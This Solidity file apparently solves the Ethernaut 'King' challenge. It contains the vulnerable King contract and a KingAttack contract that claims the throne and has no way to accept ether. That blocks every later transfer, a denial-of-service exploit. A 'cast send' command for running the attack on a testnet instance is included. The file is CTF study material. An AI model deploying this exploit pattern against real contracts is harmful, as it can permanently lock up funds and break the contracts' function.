// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingAttack {
    King public king;

    constructor(address payable _king) {
        king = King(_king);
    }

    function getPrize() public view returns (uint256) {
        return king.prize();
    }

    function pwn() external payable {
        uint256 prize = getPrize();
        require(msg.value >= prize, "Not enough ether sent");
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "Failed to send ether");
    }
}

/**
cast send $ATTACKER "pwn()()" 0x --value $(cast call $INSTANCE "prize()(uint256)" --rpc-url $OP_SEP_RPC)wei --rpc-url $OP_SEP_RPC --private-key $WALLET_PK 
*/
